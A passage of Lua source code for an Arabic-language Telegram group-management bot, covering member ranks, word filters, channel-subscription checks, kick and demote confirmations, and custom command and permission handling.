elseif DevFeras:sismember(DevFeras..'abs:owners:'..chat_id, user_id) then
var = 'owner'  
else  
var = 'No'
end  
return var
end 
--     Source DevFeras     --
local function Filters(msg, value)
local abs = (DevFeras..'bot:filters:'..msg.chat_id_)
if abs then
local names = DevFeras:hkeys(abs)
local text = ''
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not Admin(msg.sender_user_id_, msg.chat_id_)then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
DeleteMessage(chat,msgs)
end
end
end
end
--     Source DevFeras     --
local getChat = function(chat_id, cb)
tdcli_function({ID = "GetChat", chat_id_ = chat_id}, cb or dl_cb, nil)
end
--     Source DevFeras     --
function ReplyStatus(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
if dp.first_name_ ~= false then
local UserName = (dp.username_ or "Dev_Prox")
for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
dp.first_name_ = gmatch
end
if status == "reply" then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙العضو ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "ReplyAdd" then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙بواسطة ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
else
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙الحساب محذوف قم بالتاكد واعد المحاوله", 1, 'md')
end
end,nil)   
end
--     Source DevFeras     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({ ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content }, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = { ID = "InputMessageDocument", document_ = getInputFile(document), caption_ = caption } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageVoice", voice_ = getInputFile(voice), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageAudio", audio_ = getInputFile(audio), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = { ID = "InputMessageSticker", sticker_ = getInputFile(sticker), width_ = 0, height_ = 0 } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
local function getChannelMembers(channel_id, offset, filter, limit,cb) 
tdcli_function ({ 
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {ID = "ChannelMembers" .. filter},
offset_ = offset,limit_ = limit}, 
cb, nil) 
end
function formsgs(msgs) 
local MsgText = ''  
if tonumber(msgs) < 100 then 
MsgText = 'جدا ضعيف' 
elseif tonumber(msgs) < 250 then 
MsgText = 'ضعيف' 
elseif tonumber(msgs) < 500 then 
MsgText = 'غير متفاعل' 
elseif tonumber(msgs) < 750 then 
MsgText = 'متوسط' 
elseif tonumber(msgs) < 1000 then 
MsgText = 'متفاعل' 
elseif tonumber(msgs) < 2000 then 
MsgText = 'قمة التفاعل' 
elseif tonumber(msgs) < 3000 then 
MsgText = 'ملك التفاعل'  
elseif tonumber(msgs) < 4000 then 
MsgText = 'اسطورة التفاعل' 
elseif tonumber(msgs) < 5000 then 
MsgText = 'متفاعل نار' 
elseif tonumber(msgs) < 6000 then 
MsgText = 'يجدح جدح' 
elseif tonumber(msgs) < 7000 then 
MsgText = 'خيالي' 
elseif tonumber(msgs) < 8000 then 
MsgText = 'رب التفاعل' 
elseif tonumber(msgs) < 9000 then 
MsgText = 'كافر بالتفاعل' 
elseif tonumber(msgs) < 10000000000 then 
MsgText = "معلك لربك" 
end 
return MsgText
end
--     Source DevFeras     --
function absmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevFeras:get(DevFeras..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source DevFeras     --
function SourceCh(msg) 
local url,res = https.request('https://apiabs.ml/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.ChatMember.DevFeras ~= true then
Var = false
Dev_Feras(msg.chat_id_,msg.id_, 1, "⌁︙عليك الاشتراك في قناة البوت \n⌁︙قناة البوت ↫ @Dev_Prox", 1 , "html")
else
Var = true
end
return Var
end
--     Source DevFeras     --
function ChCheck(msg)
local var = true 
if DevFeras:get(DevFeras.."DevFeras2") then
local channel = ''..DevFeras:get(DevFeras..'DevFeras3')..''
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..channel..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevFeras:get(DevFeras..'bot:textch:user') then
local textchuser = DevFeras:get(DevFeras..'bot:textch:user')
Dev_Feras(msg.chat_id_, msg.id_, 1, '['..textchuser..']', 1, 'md')
else
Dev_Feras(msg.chat_id_,msg.id_, 1, "⌁︙عليك الاشتراك في قناة البوت \n⌁︙قناة البوت ↫ "..channel, 1 , "html")
end
elseif data.ok then
return var
end
else
return var
end
end
chats = {}
function tdcli_update_callback(data)
if data.ID == "UpdateNewCallbackQuery" then
local Chat_Id2 = data.chat_id_
local MsgId2 = data.message_id_
local DataText = data.payload_.data_
local Msg_Id2 = data.message_id_/2097152/0.5
if DataText == '/delyes' and DevFeras:get(DevFeras..'yes'..data.sender_user_id_) == 'delyes' then
DevFeras:del(DevFeras..'yes'..data.sender_user_id_, 'delyes')
DevFeras:del(DevFeras..'no'..data.sender_user_id_, 'delno')
if Admin(data.sender_user_id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⌁︙لا استطيع طرد ↫ "..rank_abs(data.sender_user_id_, data.chat_id_)) 
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=data.chat_id_,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,da) 
if (da and da.code_ and da.code_ == 400 and da.message_ == "CHAT_ADMIN_REQUIRED") then 
EditMsg(Chat_Id2, Msg_Id2, "⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if (da and da.code_ and da.code_ == 3) then 
EditMsg(Chat_Id2, Msg_Id2, "⌁︙البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
if da and da.code_ and da.code_ == 400 and da.message_ == "USER_ADMIN_INVALID" then 
EditMsg(Chat_Id2, Msg_Id2, "⌁︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
if da and da.ID and da.ID == "Ok" then
ChatKick(data.chat_id_, data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم طردك من المجموعه") 
return false
end
end,nil)  
end
if DataText == '/delno' and DevFeras:get(DevFeras..'no'..data.sender_user_id_) == 'delno' then
DevFeras:del(DevFeras..'yes'..data.sender_user_id_, 'delyes')
DevFeras:del(DevFeras..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء امر اطردني") 
end
--     Source DevFeras     --
if DataText == '/yesdel' and DevFeras:get(DevFeras..'yesdel'..data.sender_user_id_) == 'delyes' then
DevFeras:del(DevFeras..'yesdel'..data.sender_user_id_, 'delyes')
DevFeras:del(DevFeras..'nodel'..data.sender_user_id_, 'delno')
if DevFeras:sismember(DevFeras..'abs:monshid:'..data.chat_id_, data.sender_user_id_) then
monshid = 'المنشئين • ' else monshid = '' end 
if DevFeras:sismember(DevFeras..'abs:owners:'..data.chat_id_, data.sender_user_id_) then
owners = 'المدراء • ' else owners = '' end
if DevFeras:sismember(DevFeras..'abs:admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevFeras:sismember(DevFeras..'abs:vipmem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevFeras:sismember(DevFeras..'bot:donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevFeras:sismember(DevFeras..'abs:monshid:'..data.chat_id_, data.sender_user_id_) or DevFeras:sismember(DevFeras..'abs:owners:'..data.chat_id_, data.sender_user_id_) or DevFeras:sismember(DevFeras..'abs:admins:'..data.chat_id_, data.sender_user_id_) or DevFeras:sismember(DevFeras..'abs:vipmem:'..data.chat_id_, data.sender_user_id_) or DevFeras:sismember(DevFeras..'bot:donky:'..data.chat_id_, data.sender_user_id_) then
DevFeras:srem(DevFeras..'abs:monshid:'..data.chat_id_,data.sender_user_id_)
DevFeras:srem(DevFeras..'abs:owners:'..data.chat_id_,data.sender_user_id_)
DevFeras:srem(DevFeras..'abs:admins:'..data.chat_id_,data.sender_user_id_)
DevFeras:srem(DevFeras..'abs:vipmem:'..data.chat_id_,data.sender_user_id_)
DevFeras:srem(DevFeras..'bot:donky:'..data.chat_id_,data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم تنزيلك من ↫ ⤈\n~ ( "..monshid..''..owners..''..admins..''..vipmem..''..donky.." ) ~ \n") 
else 
if rank_abs(data.sender_user_id_, data.chat_id_) == 'العضو' then
EditMsg(Chat_Id2, Msg_Id2, "⌁︙ليس لديك رتبه في البوت") 
else 
EditMsg(Chat_Id2, Msg_Id2, "⌁︙لا استطيع تنزيل ↫ "..rank_abs(data.sender_user_id_, data.chat_id_)) 
end
end
end
if DataText == '/nodel' and DevFeras:get(DevFeras..'nodel'..data.sender_user_id_) == 'delno' then
DevFeras:del(DevFeras..'yesdel'..data.sender_user_id_, 'delyes')
DevFeras:del(DevFeras..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء امر نزلني") 
end
end
if data.ID == "UpdateNewMessage" then
local msg = data.message_
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
text = data.message_.content_.text_
if text and DevFeras:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevFeras:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevFeras:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevFeras:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
DevFeras:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الامر من المجموعه", 1, 'html')  
else
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙لايوجد امر بهذا الاسم", 1, 'html')
end
DevFeras:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevFeras:get("Feras_dev:"..bot_id.."name_bot") or "Feras")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevFeras:get("Feras_dev:"..bot_id.."name_bot") or "Feras")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevFeras:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevFeras:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevFeras:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر الجديد", 1, 'html')
DevFeras:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevFeras:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevFeras:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevFeras:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
DevFeras:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevFeras:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الامر", 1, 'html')
DevFeras:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if MonshId(msg.sender_user_id_, msg.chat_id_) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local list = DevFeras:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "⌁︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
Cmds = DevFeras:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..""..k.."~ ("..v..") \n"
end
end
if #list == 0 then
t = "⌁︙لايوجد اوامر مضافه في المجموعه"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if text == "حذف الاوامر المضافه" or text == "حذف الاوامر" or text == "مسح الاوامر المضافه" and ChCheck(msg) then
local list = DevFeras:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(list) do
DevFeras:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevFeras:del(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الاوامر المضافه في المجموعه", 1, 'html')
end
if text == "اضف امر" or text == "اضافة امر" or text == "اضافه امر" and ChCheck(msg) then
DevFeras:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر القديم", 1, 'html')
return false
end
if text == "حذف امر" or text == "مسح امر" and ChCheck(msg) then 
DevFeras:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر الذي قمت باضافته يدويا", 1, 'html')
return false
end
end
--     Source DevFeras     --
if text == "الصلاحيات" or text == "صلاحيات" and ChCheck(msg) then 
local list = DevFeras:smembers(bot_id.."Coomds"..msg.chat_id_)
if #list == 0 then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد صلاحيات مضافه", 1, 'html')
return false
end
t = "⌁︙قائمة الصلاحيات المضافه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
var = DevFeras:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..""..k.."~ "..v.." • ("..var..")\n"
else
t = t..""..k.."~ "..v.."\n"
end
end
Dev_Feras(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text == "حذف الصلاحيات" and ChCheck(msg) or text == "مسح الصلاحيات" and ChCheck(msg) then
local list = DevFeras:smembers(bot_id.."Coomds"..msg.chat_id_)
for k,v in pairs(list) do
DevFeras:del(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
DevFeras:del(bot_id.."Coomds"..msg.chat_id_)
end
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الصلاحيات المضافه", 1, 'html')
end
end
if text and text:match("^اضف صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
DevFeras:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevFeras:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
DevFeras:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n⌁︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevFeras:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الصلاحيه", 1, 'html')
end
if DevFeras:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر", 1, 'html')
DevFeras:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not MonshId(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تستطيع اضافة صلاحية ( عضو • مميز  • ادمن )\n⌁︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "ادمن" then
if not Owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تستطيع اضافة صلاحية ( عضو • مميز )\n⌁︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مميز" then
if not Admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تستطيع اضافة صلاحية ( عضو )\n⌁︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = DevFeras:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevFeras:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم اضافة الصلاحيه", 1, 'html')
DevFeras:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
local DEV_ABBAS = text:match("رفع (.*)")
if DevFeras:sismember(bot_id.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrabs = DevFeras:get(bot_id.."Comd:New:rt:bot:"..DEV_ABBAS..msg.chat_id_)
if mrabs == "مميز" and VipMem(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevFeras:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS) 
DevFeras:sadd(DevFeras..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "ادمن" and Admin(msg.sender_user_id_, msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevFeras:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)
DevFeras:sadd(DevFeras..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "مدير" and Owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevFeras:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)  
DevFeras:sadd(DevFeras..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "عضو" then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
local DEV_ABBAS = text:match("تنزيل (.*)")
if DevFeras:sismember(bot_id.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrabs = DevFeras:get(bot_id.."Comd:New:rt:bot:"..DEV_ABBAS..msg.chat_id_)
if mrabs == "مميز" and VipMem(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
DevFeras:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "ادمن" and Admin(msg.sender_user_id_, msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevFeras:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "مدير" and Owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevFeras:srem(DevFeras..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevFeras:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "عضو" then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^رفع (.*) @(.*)") and ChCheck(msg) then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if DevFeras:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrabs = DevFeras:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if mrabs == "مميز" and VipMem(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevFeras:sadd(DevFeras..'abs:vipmem:'..msg.chat_id_, result.id_)
DevFeras:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "ادمن" and Admin(msg.sender_user_id_, msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevFeras:sadd(DevFeras..'abs:admins:'..msg.chat_id_, result.id_)
DevFeras:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "مدير" and Owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevFeras:sadd(DevFeras..'abs:owners:'..msg.chat_id_, result.id_)
DevFeras:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "عضو" then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
info = "⌁︙*المعرف غير صحيح*"
Dev_Feras(msg.chat_id_, msg.id_, 1, info, 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^تنزيل (.*) @(.*)") and ChCheck(msg) then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if DevFeras:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrabs = DevFeras:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if mrabs == "مميز" and VipMem(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_, result.id_)
DevFeras:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "ادمن" and Admin(msg.sender_user_id_, msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, result.id_)
DevFeras:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "مدير" and Owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevFeras:srem(DevFeras..'abs:owners:'..msg.chat_id_, result.id_)
DevFeras:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "عضو" then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
info = "⌁︙*المعرف غير صحيح*"
Dev_Feras(msg.chat_id_, msg.id_, 1, info, 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
--     Source DevFeras     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
